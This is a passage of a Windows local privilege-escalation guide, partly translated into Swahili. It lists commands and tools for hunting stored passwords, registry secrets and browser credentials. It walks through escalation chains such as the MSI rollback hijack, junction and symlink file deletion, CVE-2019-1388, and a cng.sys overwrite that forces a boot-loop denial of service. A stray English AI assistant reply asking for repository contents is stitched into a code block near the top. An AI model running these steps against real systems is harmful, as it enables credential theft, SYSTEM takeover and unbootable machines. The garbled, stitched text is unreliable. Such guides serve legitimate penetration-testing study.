places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the list of proposed files and their contents) and I will translate the English text to Swahili, preserving markdown, links, paths and tags exactly as you specified.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Maelezo ya kuingia katika RecycleBin

Unapaswa pia kukagua Bin kutafuta maelezo ya kuingia ndani yake

Ili **kupona nywila** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya rejista

**Vifunguo vingine vya rejista vinavyoweza kuwa na maelezo ya kuingia**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia za Vivinjari

Unapaswa kuangalia dbs ambapo passwords kutoka kwa **Chrome or Firefox** zinahifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari kwa kuwa labda baadhi ya **passwords** zimetunzwa hapo.

Zana za kutoa passwords kutoka kwa vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha mawasiliano kati ya vipengee vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengee cha COM kinatambulishwa kwa class ID (CLSID) na kila kipengee hutoa utendakazi kupitia interface moja au zaidi, zinazoelezwa kwa interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza **overwrite any of the DLLs** ambazo zitatekelezwa, unaweza **escalate privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama persistence mechanism angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa Generic Password katika faili na rejista**

**Tafuta yaliyomo kwenye faili**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili lenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta katika registry kwa majina ya key na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools that search for passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **kutekeleza moja kwa moja kila metasploit POST module inayotafuta credentials** ndani ya victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta kwa njia ya moja kwa moja faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa password kutoka kwa mfumo.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kwamba **mchakato unaokimbia kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) ukiwa na **full access**. Mchakato uleule **pia huunda mchakato mpya** (`CreateProcess()`) **uliokuwa na ruhusa ndogo lakini unarithi all the open handles za mchakato mkuu**.\
Kisha, ikiwa una **full access kwa mchakato wenye ruhusa ndogo**, unaweza kuchukua open handle ya mchakato mwenye ruhusa ulioanzishwa kwa `OpenProcess()` na **kuingiza shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, zinaruhusu mawasiliano kati ya mchakato na uhamisho wa data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kinachomruhusu mchakato usiohusiana kushirikiana data, hata kwa vituo tofauti vya mtandao. Huu unafanana na usanifu wa client/server, ambapo majukumu yameainishwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe ina uwezo wa **kuchukua utambulisho** wa **client**, kwa sharti iwe na haki muhimu za **SeImpersonate**. Kutambua mchakato mwenye ruhusa (privileged process) unaozungumza kupitia pipe ambayo unaweza kuiga kunatoa fursa ya **kupata ruhusa za juu zaidi** kwa kuiga utambulisho wa mchakato huo mara tu unaposhirikiana na pipe uliyoanzisha. Kwa maelekezo juu ya jinsi ya kutekeleza aina hiyo ya shambulio, mwongozo unaosaidia unaweza kupatikana [**here**](named-pipe-client-impersonation.md) na [**here**](#from-high-integrity-to-system).

Pia zifuatazo zana zinakuwezesha **kuingilia mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kutaja na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). Mteja aliye na uthibitisho kutoka mbali anaweza kutumia njia ya matukio ya async inayotumia mailslot kubadilisha `ClientAttach` kuwa uandishi wowote wa **4-byte** kwa faili yoyote iliyopo inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za Telephony admin na kupakia DLL yoyote kama service. Mtiririko kamili:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, kunaweza kuwa na scheduled tasks au mchakato mwingine unaotekelezwa ambao hupitisha **credentials kwenye mstari wa amri**. Script ifuatayo inakamata command lines za mchakato kila sekunde mbili na inalinganisha hali ya sasa na ile ya awali, ikitoa tofauti yoyote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kunyang'anya passwords kutoka processes

## Kutoka Low Priv User hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una upatikanaji wa kiolesura cha picha (kupitia console au RDP) na UAC imewezeshwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au process nyingine yoyote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiyekuwa na vibali.

Hii inafanya iwezekane kupandisha vibali na bypass UAC kwa wakati mmoja kutokana na udhaifu huo huo. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumika wakati wa process hiyo, imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyokumbwa ni zifuatazo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Ili exploit udhaifu huu, ni muhimu kufanya hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio linaanzia kwa kutumika kwa Windows Installer's rollback feature kubadilisha faili halali na zenye madhara wakati wa mchakato wa uninstallation. Kwa hili mshambuliaji anahitaji kuunda **malicious MSI installer** itakayotumika kubandua `C:\Config.Msi` folda, ambayo baadaye Windows Installer itaitumia kuhifadhi faili za rollback wakati wa uninstall ya vifurushi vingine vya MSI ambapo faili za rollback zingeweza kubadilishwa kuwa na payload yenye madhara.

Mbinu iliyo takanwa ni ifuatayo:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **mtumiaji asiye-admin** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Mtiririko huu unahifadhi **metadata ya index** ya kabrasha.

Kwa hivyo, **ukifuta mtiririko `::$INDEX_ALLOCATION`** wa kabrasha, NTFS **itaondoa kabrasha lote** kutoka kwenye mfumo wa faili.

Unaweza kufanya hivyo kwa kutumia API za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha *file* delete API, **inafuta folder yenyewe**.

### Kutoka Kufuta Yaliyomo ya Folder hadi SYSTEM EoP
Je, primitive yako haikuruhusu kufuta files/folders yoyote, lakini **inaruhusu kufutwa kwa *yaliyomo* ya folder inayodhibitiwa na mshambuliaji**?

1. Step 1: Setup a bait folder and file
- Unda: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- Oplock hiyo **inasitisha utekelezaji** wakati mchakato wenye ruhusa unajaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Chochea mchakato wa SYSTEM (mfano, `SilentCleanup`)
- Mchakato huu unapitia folda (mfano, `%TEMP%`) na unajaribu kufuta yaliyomo ndani yake.
- Wakati inafika `file1.txt`, **oplock triggers** na huipa callback yako udhibiti.

4. Hatua 4: Ndani ya callback ya oplock – elekeza ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` kuwa tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo lingeachilia oplock mapema.

- Chaguo B: Badilisha `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga mtiririko wa ndani wa NTFS unaohifadhi metadata ya folda — kuufuta kunafuta folda.

5. Hatua 5: Achilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

Tumia primitive inayokuruhusu **kuunda arbitrary folder kama SYSTEM/admin** — hata kama **hutawezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **kabrasha** (si faili) kwa jina la **critical Windows driver**, e.g.:
```
C:\Windows\System32\cng.sys
```
- Njia hii kawaida inaendana na dereva ya kernel-mode `cng.sys`.
- Ikiwa **utaiunda mapema kama folda**, Windows itashindwa kupakia dereva halisi wakati wa boot.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa boot.
- Inaiona folda, **inashindwa kutatua dereva halisi**, na **inaanguka au kusimamisha boot**.
- Hakuna **njia mbadala**, na **hakuna kupona** bila uingiliaji wa nje (kwa mfano, ukarabati wa boot au ufikiaji wa disk).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Wakati **huduma yenye ruhusa za juu** inaandika logs/exports kwa njia inayosomwa kutoka kwa **writable config**, elekeza njia hiyo kwa kutumia **Object Manager symlinks + NTFS mount points** ili kubadilisha uandishi wa huduma yenye ruhusa kuwa overwrite ya kirahisi (hata **bila** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kwa `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Operesheni yenye ruhusa za juu inayoiandika njia hiyo (log, export, report).

**Example chain**
1. Soma config ili kupata destination ya logi yenye ruhusa, kwa mfano `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect the path without admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri sehemu yenye ruhusa ya juu iandike logi (kwa mfano, admin anachochea "send test SMS"). Uandishi sasa unawekwa katika `C:\Windows\System32\cng.sys`.
4. Angalia lengo lililobadilishwa (hex/PE parser) kuthibitisha uharibifu; reboot inalazimisha Windows kupakia njia ya driver iliyoharibika → **boot loop DoS**. Hii pia inajumuisha faili yoyote iliyolindwa ambayo privileged service itafungua kwa kuandika.

> `cng.sys` kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, ikifanya kuwa DoS sink imara kwa data iliyoharibika.



## **Kutoka High Integrity hadi SYSTEM**

### **New service**

Ikiwa tayari unakimbia kwenye mchakato wa High Integrity, **njia kuelekea SYSTEM** inaweza kuwa rahisi kwa **kuunda na kutekeleza new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wakati wa kuunda service binary hakikisha ni service halali au kwamba binary inafanya vitendo vinavyohitajika kwa haraka kwani itauawa ndani ya 20s ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye High Integrity process unaweza kujaribu **kuwezesha the AlwaysInstallElevated registry entries** na **install** reverse shell kwa kutumia _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Ikiwa una token privileges hizo (labda utazipata katika tayari High Integrity process), utaweza **fungua karibu mchakato wowote** (si protected processes) with the SeDebug privilege, **copy the token** ya mchakato, na kuunda **arbitrary process with that token**.\
Kutumia technique hii kawaida huchagua mchakato wowote unaoendesha kama SYSTEM with all the token privileges (_ndio, unaweza kupata SYSTEM processes bila token privileges zote_).\
**Unaweza kupata** [**mfano wa code unaotekeleza technique iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technique hii inatumiwa na meterpreter kupandisha daraja kwa `getsystem`. Technique inajumuisha **kuunda pipe na kisha kuunda/kunyanyasa service ili kuandika kwenye pipe hiyo**. Kisha, **server** aliyeunda pipe akitumia **`SeImpersonate`** privilege ataweza **impersonate the token** ya pipe client (service) kupata SYSTEM privileges.\
Ikiwa unataka [**kujifunza zaidi kuhusu name pipes soma hii**](#named-pipe-client-impersonation).\
Ikiwa unataka kuona mfano wa [**jinsi ya kwenda kutoka High Integrity hadi System ukitumia name pipes soma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utafanikiwa **hijack a dll** inayopakiwa na **process** inayoendesha kama **SYSTEM** utaweza kutekeleza arbitrary code kwa ruhusa hizo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation, na zaidi, ni **rahisi zaidi kufikiwa kutoka kwa High Integrity process** kwani itakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

Soma: [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na faili nyeti (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imetambuliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia baadhi ya misconfigurations inayowezekana na kukusanya info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Inachota taarifa za sesheni zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Inachota credentials kutoka Credential Manager. Imetambuliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Inafanya spray nywila zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Uchunguzi wa msingi wa Windows kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Tafuta privesc vulnerabilities zilizo julikana (IMEACHWA kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa local **(Inahitaji Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta privesc vulnerabilities zilizo julikana (inahitaji kucompile kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Inafanya enumeration ya host kutafuta misconfigurations (zaidi ni tool ya kukusanya info kuliko privesc) (inahitaji kucompile) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Inachota credentials kutoka kwa programu nyingi (exe precompiled kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Angalia misconfiguration (executable precompiled kwenye github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations inayowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyotengenezwa kulingana na chapisho hili (hainahitaji accesschk kufanya kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Inasoma output ya **systeminfo** na inapendekeza exploits zinazofanya kazi (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Inasoma output ya **systeminfo** na inapendekeza exploits zinazofanya kazi (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa kucompile project ukitumia version sahihi ya .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona version ya .NET iliyosakinishwa kwenye host ya victim unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
